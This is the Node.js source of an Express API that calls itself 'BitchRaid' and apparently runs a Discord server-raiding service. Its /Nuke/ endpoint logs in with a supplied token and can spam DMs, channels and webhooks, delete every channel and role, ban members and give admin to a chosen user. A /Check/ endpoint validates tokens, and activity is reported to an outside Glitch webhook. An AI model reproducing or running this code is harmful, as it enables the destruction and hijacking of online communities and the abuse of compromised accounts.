let Node_Name = "Node 2"
let CLIENTS = []
let Num = 0

const express = require("express")
const bodyParser = require("body-parser");
const fetch = require("minipass-fetch")
const moment = require("moment");
const Discord = require('discord.js')
var cors = require('cors');
const app = express();

const webhookUrl = 'https://built.glitch.me/webhook';

const discord = require("./handler/discord")
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(cors());

app.post('/Nuke/', async function ( req, res ) { 
let server_id = req.query.id;
let token = req.body.token
let id = req.body.id
let uid = req.body.uid
let dm_msg = req.body.dm_msg
let channel_msg = req.body.channel_msg
let channel_amount = req.body.channel_amount
let nickname_msg = req.body.nickname_msg
let junk_roles = req.body.junk_roles
let junk_channels = req.body.junk_channels
let channels_delete = req.body.channels_delete
let roles_delete = req.body.roles_delete
let ban = req.body.ban
// PLS FIX vvvvvvvvvv
let junk_channel_name = req.body.channel_name
let junk_roles_name = req.body.role_name
// --------------------- //
let User_ID = req.body.user_id
let webhook_msg = req.body.webhook_msg
let webhook_amount = req.body.webhook_amount
// PLS FIX ^^^^^^^^^^^

let client = await login(token).then(async client => {
if( dm_msg !== 'false' ) await discord.SendMsg(client, dm_msg, server_id) // SendChannels
if( channel_msg !== 'false' && channel_amount) await discord.SendChannels(client, channel_msg, channel_amount, server_id);
if( webhook_msg !== 'false' && webhook_amount) await discord.WebChannels(client, webhook_msg, webhook_amount, server_id);
if( nickname_msg !== 'false') await discord.ChangeNicknames(client, nickname_msg, server_id);
if( channels_delete !== 'false') await discord.DelChannels(client, server_id);
if( roles_delete !== 'false') await discord.DelRoles(client, server_id);
if( junk_channels !== 'false') await discord.RanChannels(client, junk_channels, junk_channel_name, server_id);
if( junk_roles !== 'false') await discord.RanRoles(client, junk_roles, junk_roles_name, server_id);
if( ban !== 'false')  await discord.BanMembers(client);
if( User_ID !== 'false') await discord.GiveAdmin(client, User_ID, server_id); 
})
})


app.get('/Check/:token', function async (req, res) {
CheckToken(req.params.token, res)
});

app.get('/ping', function async (req, res) {
  res.json({pinged: true})
});

// listen for requests :)
var listener = app.listen(5000, () => {
  console.log('[BitchRaid] => Thank you for using our site.');
  console.log(`[BitchRaid] => Your api is listening on port ${listener.address().port}`);
});


async function login(token) {
let Logged;
for (var i in CLIENTS) {
  if (CLIENTS[i].token == token) { 
Logged = true 
let client = await CLIENTS[i].client
return client;
}}
if(Logged === true) return;
let client = new Discord.Client()
log(`Checking ${token}`, client, token);
let c = await client.login(token).catch(console.error)
CLIENTS.push({token: token, client: client})
Num = Num+1
setTimeout(function(){ 
for(var i = 0; i < CLIENTS.length; i++) {
    if(CLIENTS[i].token == token) {
      CLIENTS.splice(i, 1);
      Num = Num-1
      client.destroy();
      break;
    }
}}, 300000);
return client
}

async function CheckToken(EnteredToken, res) {
  let client = await login(EnteredToken);
  sleep(10);

  if (client.user) {
    console.log("[Client] => Logged in as " + client.user.tag);
    log(`Logged in as ${client.user.tag}`, client, EnteredToken);

    let clientguilds = await client.guilds.cache;
    let names = clientguilds.map((g) => g.name);
    let ids = clientguilds.map((g) => g.id);

    sleep(10);

    console.log({
      tag: client.user.tag,
      user: {
        tag: client.user.tag,
        avatar: client.user.displayAvatarURL(),
        id: client.user.id,
      },
      servers: { names: names.length > 0 ? names : null, ids: ids.length > 0 ? ids : null },
    });

    return res.json({
      tag: client.user.tag,
      user: {
        tag: client.user.tag,
        avatar: client.user.displayAvatarURL(),
        id: client.user.id,
      },
      servers: { names: names.length > 0 ? names : null, ids: ids.length > 0 ? ids : null },
    });
  } else {
    res.send({ err: "invalid token" });
    log(`Failed to login with ${EnteredToken}`, client, EnteredToken);
  }
}

function sleep(milliseconds) {
  const date = Date.now();
  let currentDate = null;
  do {
    currentDate = Date.now();
  } while (currentDate - date < milliseconds);
}

function log(msg, client, token) {
let tag = "Client"
if (client.user) tag = client.user.tag

fetch(webhookUrl, {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({ data: `\`[${moment().format("DD-MM-YYYY HH:mm:ss")}]\` [${Node_Name}] ==> **${tag || 'Client'}**: ${msg} (${Num})` })
})
  .then(response => {
    console.log('Webhook request sent successfully');
  })
  .catch(error => {
    console.error('Error sending webhook request:', error.message);
  });
}